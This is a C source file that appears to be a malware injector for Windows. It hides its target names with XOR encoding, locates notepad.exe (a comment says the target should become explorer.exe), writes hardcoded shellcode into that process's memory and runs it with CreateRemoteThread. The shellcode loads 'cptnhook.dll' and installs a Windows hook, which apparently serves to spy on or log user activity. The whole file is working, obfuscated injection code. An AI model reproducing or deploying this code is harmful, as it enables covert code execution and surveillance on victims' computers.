#include "peterpan.h"

#define DECODE_STRING_XOR_BYTE 0x11
#define SHELLCODE 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x1C, 0x8D, 0x45, 0xE4, 0x56, 0x50, 0xB8, 0x7B, 0x1D, 0x80, 0x7C, 0xC6, 0x45, 0xF4, 0x48, 0xC6, 0x45, 0xF5, 0x6F, 0xC6, 0x45, 0xF6, 0x6F, 0xC6, 0x45, 0xF7, 0x6B, 0xC6, 0x45, 0xF8, 0x50, 0xC6, 0x45, 0xF9, 0x72, 0xC6, 0x45, 0xFA, 0x6F, 0xC6, 0x45, 0xFB, 0x63, 0xC6, 0x45, 0xFC, 0x00, 0xC6, 0x45, 0xE4, 0x63, 0xC6, 0x45, 0xE5, 0x70, 0xC6, 0x45, 0xE6, 0x74, 0xC6, 0x45, 0xE7, 0x6E, 0xC6, 0x45, 0xE8, 0x68, 0xC6, 0x45, 0xE9, 0x6F, 0xC6, 0x45, 0xEA, 0x6F, 0xC6, 0x45, 0xEB, 0x6B, 0xC6, 0x45, 0xEC, 0x2E, 0xC6, 0x45, 0xED, 0x64, 0xC6, 0x45, 0xEE, 0x6C, 0xC6, 0x45, 0xEF, 0x6C, 0xC6, 0x45, 0xF0, 0x00, 0xFF, 0xD0, 0x8B, 0xF0, 0x59, 0x85, 0xF6, 0x75, 0x06, 0x83, 0xC8, 0xFF, 0x5E, 0xC9, 0xC3, 0x8D, 0x45, 0xF4, 0x50, 0x56, 0xB8, 0x30, 0xAE, 0x80, 0x7C, 0xFF, 0xD0, 0x59, 0x59, 0x85, 0xC0, 0x75, 0x05, 0x6A, 0xFE, 0x58, 0xEB, 0xE6, 0x6A, 0x00, 0x56, 0x50, 0x6A, 0x03, 0xB8, 0x11, 0x12, 0x43, 0x7E, 0xFF, 0xD0, 0x83, 0xC4, 0x10, 0x68, 0xFF, 0xFF, 0xFF, 0x00, 0xB8, 0x46, 0x24, 0x80, 0x7C, 0xFF, 0xD0, 0x59, 0xEB, 0xF1

char STR_C_TEMP_TXT[] = {0x72,  0x2b,  0x4d,  0x65,  0x74,  0x7c,  0x61,  0x3f,  0x65,  0x69,  0x65,  0x00};
char STRexit_D_S[] = {0x55,  0x58,  0x54,  0x39,  0x34,  0x75,  0x38,  0x2b,  0x31,  0x34,  0x62,  0x1b,  0x00};
char STR_A[] = {0x70,  0x00};
char STR_NOTEPAD_EXE[] = {0x7f,  0x7e,  0x65,  0x74,  0x61,  0x70,  0x75,  0x3f,  0x74,  0x69,  0x74,  0x00}; // TODO: delete this from here and `_strings`
char STR_EXPLORER_EXE[] = {0x74,  0x69,  0x61,  0x7d,  0x7e,  0x63,  0x74,  0x63,  0x3f,  0x74,  0x69,  0x74,  0x00};
char* _strings[] = {STR_C_TEMP_TXT, STRexit_D_S, STR_A, STR_NOTEPAD_EXE, STR_EXPLORER_EXE};

void decodeStrings(void) {
	unsigned int i, j;
	for (i = 0; i < sizeof(_strings)/sizeof(char*); i++) {
		for (j = 0; j < strlen(_strings[i]); j++) {
			_strings[i][j] = _strings[i][j] ^ DECODE_STRING_XOR_BYTE;
		}
	}
};

BOOL _isProcessNamed(DWORD processID, const char * name) {
	char processName[MAX_PATH];
	HANDLE hProcess;
	HMODULE hMod;
	DWORD cbNeeded;
	processName[0] = 0;
	hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ , FALSE, processID);
	if (hProcess != NULL) {
		if (EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
			GetModuleBaseNameA(hProcess, hMod, processName, sizeof(processName)/sizeof(TCHAR));
		}
	}
	CloseHandle(hProcess);
	return 0 == _stricmp(processName, name);
}

/*
 * returns the pid of the first process named `name`
 */
DWORD findProcessByName(const char * name) {
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;
	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		return 0;
	}
	cProcesses = cbNeeded / sizeof(DWORD);
	for (i = 0; i < cProcesses; i++) {
		if( aProcesses[i] != 0) {
			if (_isProcessNamed(aProcesses[i], name)) {
				return aProcesses[i];
			}
		}
	}
	return 0;
}

int main() {
	int pid;
	HANDLE process;
	byte buf[] = {SHELLCODE};
	LPVOID address;
	SIZE_T bytesWritten;
	BOOL wrote, changed, freeOK;
	DWORD oldProtect;
	HANDLE hThread;
	LPTHREAD_START_ROUTINE startRoutine;
	typedef HHOOK (*HINSTALLER)(HMODULE);
	typedef BOOL (*HUNINSTALLER)(HHOOK);

	decodeStrings();

	//TODO: replace STR_NOTEPAD_EXE with STR_EXPLORER_EXE
	pid = findProcessByName(STR_NOTEPAD_EXE);
	//pid = findProcessByName(STR_EXPLORER_EXE);
	if (pid == 0) {
		exit(-1);
	}
	process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid);
	if (process == NULL) {
		exit(-2);
	}

	address = VirtualAllocEx(process, NULL, sizeof(buf), MEM_COMMIT, PAGE_READWRITE);
	if (address == NULL) {
		CloseHandle(process);
		exit(-5);
	}

	bytesWritten = 0;
	wrote = WriteProcessMemory(process,address,buf,sizeof(buf),&bytesWritten);
	if (!wrote){
		exit(-6);
	}
	if (bytesWritten != sizeof(buf)){
		exit(-7);
	}
	oldProtect = 0;
	changed = VirtualProtectEx(process,address,sizeof(buf),PAGE_EXECUTE_READ,&oldProtect);
	if (!changed){
		exit(-8);
	}

	#pragma warning(disable:4055) // 'type cast' : from data pointer 'LPVOID' to function pointer 'LPTHREAD_START_ROUTINE'
	startRoutine = (LPTHREAD_START_ROUTINE)address;
	hThread = CreateRemoteThread(process,NULL,0,startRoutine,NULL,0,NULL);
	if (NULL == hThread){
		exit(-9);
	}
	(void)freeOK;
	CloseHandle(process);
	return 0;
}
